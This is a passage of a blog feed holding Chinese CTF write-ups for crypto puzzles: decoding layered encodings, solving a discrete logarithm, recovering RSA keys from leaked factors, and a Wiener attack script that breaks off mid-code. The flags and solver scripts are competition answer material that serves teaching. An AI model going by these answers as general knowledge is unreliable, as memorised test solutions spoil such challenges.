文件</p>\n<p>用 java 自带的 VisualIVM 去查看。</p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/bcf9782e-73eb-4df1-b92d-aec244c0c628.png\" alt=\"image-20240414161028946\"></p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/a09f3c0c-3456-4b27-bd4c-ad27518a4361.png\" alt=\"image-20240414161028946\"></p>\n<p>大概翻阅几下，找到几串百家姓密文</p>\n<p>解密得到</p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/0d4c10f9-3d7d-4d68-981b-685b70c111e6.png\" alt=\"image-20240414161028946\"></p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/9a84f1ed-4bb2-4046-b6dd-66f71ad72897.png\" alt=\"image-20240414161028946\"></p>\n<blockquote aa534ac5-2f1a-466c-baf7-1ad7edb6adb2=\"\">\n<p>一串 base64 密文和类似码表的东西</p>\n<p>观测 base64 码表长度小于 64，进行补齐，发现缺的为 A Z 两个大写字母（下面有用 悲！</p>\n<p>密文的 UVWXY 很明显是瞎填充的。。。删除即可</p>\n<p>此时密文为：pCNxpTJxojkPd65zdiQOpz5xbjgSdCcJoC5CdOQNomgTpmhydC5oz9</p>\n<p>而解密结果为：flag {aa534ac5-2f1a-466c-baf7-1ad7edb6aX.</p>\n<p>此时要用到 A Z 两个字母，进行尝试后</p>\n<p>pCNxpTJxojkPd65zdiQOpz5xbjgSdCcJoC5CdOQNomgTpmhydC5Aoz9Z</p>\n<p>发现此时能的够正确的得到明文</p>\n<p>flag</p>\n</blockquote>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/03/04/qsnctf-round1-wp/",
            "url": "https://yhuanhuan01.github.io/2024/03/04/qsnctf-round1-wp/",
            "title": "qsnctf_round1_wp",
            "date_published": "2024-03-04T10:34:35.000Z",
            "content_html": "<h1 id=\"青少年ctf擂台挑战赛-2024-round-1_wp\"><a class=\"markdownIt-Anchor\" href=\"#青少年ctf擂台挑战赛-2024-round-1_wp\">#</a> 青少年 CTF 擂台挑战赛 2024 #Round 1_WP</h1>\n<blockquote>\n<p>排名：3</p>\n</blockquote>\n<p><img data-src=\"/img/qsnctf_round1/image-20240301220119039.png\" alt=\"image-20240301220119039\"></p>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> CRYPTO</h2>\n<h3 id=\"四重加密\"><a class=\"markdownIt-Anchor\" href=\"#四重加密\">#</a> 四重加密</h3>\n<p>压缩包备注</p>\n<blockquote>\n<p>OFZW4Y3UMY======</p>\n</blockquote>\n<p>base64 解得</p>\n<blockquote>\n<p>qsnctf</p>\n</blockquote>\n<p>解开压缩包得到 HTML 转移得到 md 格式问题自己转成维吉尼亚加密形式</p>\n<blockquote>\n<p>zcye{mxmemtxrzt_lzbha_kwmqzec}|key=hello</p>\n</blockquote>\n<p>得到 rot13 的 flag</p>\n<blockquote yqitbfqnoi_xsxwp_wpifoqv=\"\">\n<p>synt</p>\n</blockquote>\n<blockquote ldvgosdabv_kfkjc_jcvsbdi=\"\">\n<p>flag</p>\n</blockquote>\n<h3 id=\"ez_log\"><a class=\"markdownIt-Anchor\" href=\"#ez_log\">#</a> ez_log</h3>\n<p>附件：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">b'key&#123;xxxxxxx&#125;'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token number\">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>g<span class=\"token operator\">=</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c='</span></span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    c<span class=\"token operator\">=</span><span class=\"token number\">2253565561143760792334512129664721558389652360283869919781040673562790797442214510219594286692887815068304926805836174262275347087135150894599629786923362784354321271799896941439805091639376</span></pre></td></tr></table></figure><p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0x1aWluby9hcnRpY2xlL2RldGFpbHMvMTI2MTE3OTg1\">BUUCTF——CRYPTO（记录不熟悉的题）(4)</span></p>\n<p><strong>离散对数问题</strong></p>\n<blockquote>\n<p>a^x ≡ b (mod m)<br>\n 求解 x</p>\n</blockquote>\n<p>利用 sympy 库中的 discrete_log (x,y,z) 函数可求解，x: 模数，y: 余数，z: 底数</p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sympy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">2253565561143760792334512129664721558389652360283869919781040673562790797442214510219594286692887815068304926805836174262275347087135150894599629786923362784354321271799896941439805091639376</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token number\">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>flag <span class=\"token operator\">=</span> sympy<span class=\"token punctuation\">.</span>discrete_log<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># b'key&#123;lLNYs7&#125;'</span></pre></td></tr></table></figure><p>把 key 放进去即可得到 flag</p>\n<h3 id=\"解个方程\"><a class=\"markdownIt-Anchor\" href=\"#解个方程\">#</a> 解个方程</h3>\n<pre><code>欢迎来到青少年CTF，领取你的题目，进行解答吧！这是一道数学题！！\n    p = 173834522485366574285361213529180163119\n    q = 122713369465742269313197063464523776107\n    e = 65537\n    d = ?\n    \n</code></pre>\n<p>脚本；</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">173834522485366574285361213529180163119</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">122713369465742269313197063464523776107</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 15100911795189740543592377616991756144840586906302883747149248640494852701369</span></pre></td></tr></table></figure><h3 id=\"ezrsa\"><a class=\"markdownIt-Anchor\" href=\"#ezrsa\">#</a> ezrsa</h3>\n<p>源码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b'qsnctf&#123;xxx-xxxx-xxxx-xxxx-xxxxxxxxx&#125;'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">*</span> r</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>leak <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'leak = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>leak<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># c = 173595148273920891298949441727054328036798235134009407863895058729356993814829340513336567479145746034781201823694596731886346933549577879568197521436900228804336056005940048086898794965549472641334237175801757569154295743915744875800647234151498117718087319013271748204766997008772782882813572814296213516343420236873651060868227487925491016675461540894535563805130406391144077296854410932791530755245514034242725719196949258860635915202993968073392778882692892</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># n = 1396260492498511956349135417172451037537784979103780135274615061278987700332528182553755818089525730969834188061440258058608031560916760566772742776224528590152873339613356858551518007022519033843622680128062108378429621960808412913676262141139805667510615660359775475558729686515755127570976326233255349428771437052206564497930971797497510539724340471032433502724390526210100979700467607197448780324427953582222885828678441579349835574787605145514115368144031247</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># leak = 152254254502019783796170793516692965417859793325424454902983763285830332059600151137162944897787532369961875766745853731769162511788354655291037150251085942093411304833287510644995339391240164033052417935316876168953838783742499485868268986832640692657031861629721225482114382472324320636566226653243762620647</span></pre></td></tr></table></figure><p><code>n//leak</code>  即可得到 r，用 r 求逆元后再 <code>pow(c, d, r)</code>  即可得到 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">173595148273920891298949441727054328036798235134009407863895058729356993814829340513336567479145746034781201823694596731886346933549577879568197521436900228804336056005940048086898794965549472641334237175801757569154295743915744875800647234151498117718087319013271748204766997008772782882813572814296213516343420236873651060868227487925491016675461540894535563805130406391144077296854410932791530755245514034242725719196949258860635915202993968073392778882692892</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">1396260492498511956349135417172451037537784979103780135274615061278987700332528182553755818089525730969834188061440258058608031560916760566772742776224528590152873339613356858551518007022519033843622680128062108378429621960808412913676262141139805667510615660359775475558729686515755127570976326233255349428771437052206564497930971797497510539724340471032433502724390526210100979700467607197448780324427953582222885828678441579349835574787605145514115368144031247</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>leak <span class=\"token operator\">=</span> <span class=\"token number\">152254254502019783796170793516692965417859793325424454902983763285830332059600151137162944897787532369961875766745853731769162511788354655291037150251085942093411304833287510644995339391240164033052417935316876168953838783742499485868268986832640692657031861629721225482114382472324320636566226653243762620647</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>leak</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># print(r)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>r <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># print(d)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>flag <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># b'qsnctf&#123;12ff81e0-7646-4a96-a7eb-6a509ec01c9e&#125;'</span></pre></td></tr></table></figure><h3 id=\"factor1\"><a class=\"markdownIt-Anchor\" href=\"#factor1\">#</a> factor1</h3>\n<p>题目：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>d <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"qsnctf&#123;\"</span> <span class=\"token operator\">+</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&#125;\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span></pre></td></tr></table></figure><p>维纳攻击求 p 和 q。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>       <span class=\"token comment\">#使用辗转相处将分数 x/y 转为连分数的形式</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    res<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">while</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        res<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>x<span class=\"token operator\">//</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        x<span class=\"token punctuation\">,</span>y<span class=\"token operator\">=</span>y<span class=\"token punctuation\">,</span>x<span class=\"token operator\">%</span>y</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">continued_fraction</span><span class=\"token punctuation\">(</span>sub_res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    numerator<span class=\"token punctuation\">,</span>denominator<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> sub_res<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>      <span class=\"token comment\">#从 sublist 的后面往前循环</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        denominator<span class=\"token punctuation\">,</span>numerator<span class=\"token operator\">=</span>numerator<span class=\"token punctuation\">,</span>i<span class=\"token operator\">*</span>numerator<span class=\"token operator\">+</span>denominator</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> denominator<span class=\"token punctuation\">,</span>numerator   <span class=\"token comment\">#得到渐进分数的分母和分子，并返回</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#求解每个渐进分数</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sub_fraction</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    res<span class=\"token operator\">=</span>transform<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    res<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>continued_fraction<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#将连分数的结果逐一截取以求渐进分数</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_pq</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>      <span class=\"token comment\">#由 p+q 和 pq 的值通过维达定理来求解 p 和 q</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    par<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>isqrt<span class=\"token punctuation\">(</span>b<span class=\"token operator\">*</span>b<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token operator\">*</span>a<span class=\"token operator\">*</span>c<span class=\"token punctuation\">)</span>   <span class=\"token comment\">#由上述可得，开根号一定是整数，因为有解</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    x1<span class=\"token punctuation\">,</span>x2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b<span class=\"token operator\">+</span>par<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b<span class=\"token operator\">-</span>par<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> x1<span class=\"token punctuation\">,</span>x2</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">wienerAttack</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> sub_fraction<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#用一个 for 循环来注意试探 e/n 的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">if</span> k<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>                     <span class=\"token comment\">#可能会出现连分数的第一个为 0 的情况，排除</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">*</span>d<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>k<span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>             <span class=\"token comment\">#ed=1 (mod φ(n)) 因此如果找到了 d 的话，(ed-1) 会整除 φ(n), 也就是存在 k 使得 (e*d-1)//k=φ(n)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        phi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">*</span>d<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token 